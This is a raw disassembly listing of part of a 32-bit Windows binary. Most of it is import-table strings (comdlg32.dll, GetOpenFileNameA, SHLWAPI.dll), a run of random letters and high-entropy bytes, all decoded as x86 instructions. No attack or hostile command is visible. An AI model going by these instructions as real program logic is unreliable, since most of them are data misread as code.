  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   QWORD PTR [ebx+0x46]
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [ecx+edx*1],dh
  414bc0:	inc    ebx
  414bc1:	add    BYTE PTR [ecx+0x49],bl
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	pop    eax
  414c0f:	and    DWORD PTR [ebx+0x0],eax
  414c12:	add    BYTE PTR [eax],al
  414c14:	add    BYTE PTR [eax],al
  414c16:	dec    ecx
  414c17:	add    BYTE PTR [eax+eax*1+0x69],al
  414c1b:	add    BYTE PTR [eax+eax*1+0x4b],ah
  414c1f:	add    BYTE PTR [edx+0x0],cl
  414c22:	dec    ebx
  414c23:	add    BYTE PTR [edx+0x0],cl
  414c26:	inc    esp
  414c27:	add    BYTE PTR [ebx+0x0],ch
  414c2a:	ins    BYTE PTR es:[edi],dx
  414c2b:	add    BYTE PTR [edx+0x0],ch
  414c2e:	inc    esp
  414c2f:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c33:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c37:	add    BYTE PTR [ecx+0x0],cl
  414c3a:	push   ebp
  414c3b:	add    BYTE PTR [edx+0x0],cl
  414c3e:	dec    ebx
  414c3f:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c43:	add    BYTE PTR [edx+0x0],cl
  414c46:	dec    ebx
  414c47:	add    BYTE PTR [eax+0x0],cl
  414c4a:	inc    esp
  414c4b:	add    BYTE PTR [edx+0x0],cl
	...
  414c56:	imul   ebp,DWORD PTR fs:[edx+0x73],0x6b
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fst    DWORD PTR [ecx]
  414e41:	xor    DWORD PTR [eax],edi
  414e43:	repnz mov ebp,fs
  414e46:	add    BYTE PTR [eax],al
  414e48:	cmc    
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    ah,bh
  414e4d:	mov    al,ds:0xf27c8cab
  414e52:	push   0x77
  414e54:	cmp    esi,DWORD PTR [esi+0x5e]
  414e57:	retf   0x5f4
  414e5a:	leave  
  414e5b:	into   
  414e5c:	fnstenv [edi+0x629fce6b]
  414e62:	dec    ebp
  414e63:	test   DWORD PTR ss:[ebx+0x7b1d51e5],esp
  414e6a:	or     eax,0x9aa1232a
  414e6f:	sub    DWORD PTR [esi-0x6995c9cc],edi
  414e75:	pop    ds
  414e76:	fs std 
  414e78:	xor    eax,0x5c4ef388
  414e7d:	xor    DWORD PTR [edi+0x6a7b6cc9],edi
  414e83:	icebp  
  414e84:	icebp  
  414e85:	mov    edx,0x9afb845c
  414e8a:	daa    
  414e8b:	mov    edx,esp
  414e8d:	(bad)  [ebp+0x1a478154]
  414e93:	je     0x414ec7
  414e95:	sub    al,0x86
  414e97:	push   ds
  414e98:	push   esi
  414e99:	ss je  0x414e5f
  414e9c:	sbb    ah,BYTE PTR [eax-0x49]
  414e9f:	pop    edi
  414ea0:	ja     0x414f08
  414ea2:	jmp    0x2744:0xf597d943
  414ea9:	in     eax,0xc9
  414eab:	aam    0x3a
  414ead:	test   eax,0xcc4b1790
  414eb2:	pop    eax
  414eb3:	aas    
  414eb4:	ds jb  0x414eb8
  414eb7:	mov    ds,WORD PTR [edi]
  414eb9:	test   al,0xdd
  414ebb:	loop   0x414eb3
  414ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebe:	adc    BYTE PTR [ebp+0x777ea699],dh
  414ec4:	ss ret 0xf5d5
  414ec8:	jg     0x414f43
  414eca:	or     bl,bl
  414ecc:	inc    edx
  414ecd:	sbb    DWORD PTR [ebp-0x20402db2],esp
  414ed3:	jbe    0x414eaf
  414ed5:	dec    ecx
  414ed6:	xchg   edx,eax
  414ed7:	gs mov dh,ch
  414eda:	jp     0x414eef
  414edc:	mov    WORD PTR [ebx],ss
  414ede:	test   ebp,0x9fa11b69
  414ee4:	dec    ecx
  414ee5:	gs pusha 
  414ee7:	xor    al,0x9e
  414ee9:	cs mov ebx,es
  414eec:	pop    eax
  414eed:	gs adc al,0x72
  414ef0:	pop    ecx
  414ef1:	inc    edx
  414ef2:	xor    BYTE PTR ds:[ecx],0x7c
  414ef6:	or     dl,cl
  414ef8:	mov    ds:0xb6ecc243,eax
  414efd:	xor    al,0x71
  414eff:	mov    bl,0x5b
  414f01:	mov    al,ds:0xc6872f3e
  414f06:	xchg   BYTE PTR [edi-0x7],ch
  414f09:	lea    esi,[ecx-0x52]
  414f0c:	jno    0x414ee2
  414f0e:	scas   eax,DWORD PTR es:[edi]
  414f0f:	mov    ebp,0xf684dfdb
  414f14:	or     al,0x22
  414f16:	pop    ebp
  414f17:	xchg   DWORD PTR [ebx+eiz*4-0x70a6713c],edi
  414f1e:	cwde   
  414f1f:	fsubr  DWORD PTR [esp+edx*8]
  414f22:	mov    edx,0x3cecf175
  414f27:	dec    ebp
  414f28:	inc    ebx
  414f2a:	nop
  414f2b:	mov    esp,0x18b458d8
  414f30:	in     al,0xc4
  414f32:	sub    BYTE PTR ds:0x113d0710,0x3d
  414f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3a:	sahf   
  414f3b:	dec    edi
  414f3c:	jecxz  0x414f61
  414f3e:	fisubr WORD PTR [edx+0x6c]
	...
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x5f2e
  414fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc3:	mov    esi,0xe681
  414fc8:	cmc    
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [ebx],dh
  414fcd:	xor    al,0xd8
  414fcf:	call   0x45a5:0x60f73b90
  414fd6:	loop   0x414f9b
  414fd8:	mov    ch,0x1
  414fda:	scas   eax,DWORD PTR es:[edi]
  414fdb:	mov    edi,0x862d9aea
  414fe0:	add    ah,BYTE PTR ds:0xcc1e8bdf
  414fe6:	and    DWORD PTR [ecx+0x3f],ebp
  414fe9:	int3   
  414fea:	push   cs
  414feb:	in     eax,0x2e
  414fed:	jl     0x414fcd
  414fef:	fidivr WORD PTR [eax-0x7d]
  414ff2:	out    0x39,eax
  414ff4:	adc    eax,0xa737bc8e
  414ff9:	pushf  
  414ffa:	ins    DWORD PTR es:[edi],dx
  414ffb:	lds    ebx,FWORD PTR [esi-0x6e]
  414ffe:	int3   
  414fff:	stos   DWORD PTR es:[edi],eax
  415000:	mov    al,0xe8
  415002:	sub    al,0xcc
  415004:	jnp    0x415080
  415006:	aas    
  415007:	dec    edx
  415008:	xchg   esp,eax
  415009:	cli    
  41500a:	mov    BYTE PTR [ebp+edx*8+0x6ab50f07],bh
  415011:	mov    esi,esi
  415013:	adc    dh,BYTE PTR [ebx+0x1a]
  415016:	adc    dl,al
  415018:	test   al,0x72
  41501a:	popf   
  41501b:	test   al,0x7b
  41501d:	sahf   
  41501e:	dec    edi
  41501f:	sbb    DWORD PTR [ebx+0xcdf3703],0x8fc05dad
  415029:	dec    eax
  41502a:	dec    edi
  41502b:	repnz adc BYTE PTR [eax],cl
  41502e:	fild   WORD PTR [edx]
  415030:	or     ebp,edx
  415032:	dec    eax
  415033:	int    0xe0
  415035:	inc    esp
  415036:	adc    ecx,esi
  415038:	jecxz  0x415085
  41503a:	sbb    eax,0x1450bfcd
  41503f:	mov    ch,dl
  415041:	pop    es
  415042:	call   0xa324:0xeb66c155
  415049:	call   0x175d5fa
  41504e:	sub    bl,0xcc
  415051:	and    eax,0x814fcc32
  415056:	pusha  
  415057:	lods   al,BYTE PTR ds:[esi]
  415058:	mov    al,0xdf
  41505a:	loop   0x41503b
  41505c:	pop    edi
  41505d:	inc    edx
  41505e:	cmp    esi,DWORD PTR [esp+edx*1]
  415061:	add    ecx,ecx
  415063:	inc    esi
  415064:	(bad)  [ebp-0x60]
  415067:	mov    ebx,0xf4589f7
  41506c:	dec    eax
  41506d:	mov    ah,0x7c
  41506f:	add    al,0xe9
  415071:	push   es
  415072:	pop    es
  415073:	add    ah,al
  415075:	pop    edx
  415076:	adc    BYTE PTR [edi-0xa92e671],0xac
  41507d:	hlt    
  41507e:	out    dx,al
  41507f:	mov    dh,0xd0
  415081:	sahf   
  415082:	sti    
  415083:	rcr    BYTE PTR [eax-0x16b3b0e7],1
  415089:	dec    ebp
  41508a:	mov    ebp,0xdb2400aa
  41508f:	push   ebx
  415090:	push   ebp
  415091:	ds jne 0x4150ea
  415094:	pop    edi
  415095:	repz sbb eax,0xc1c467f1
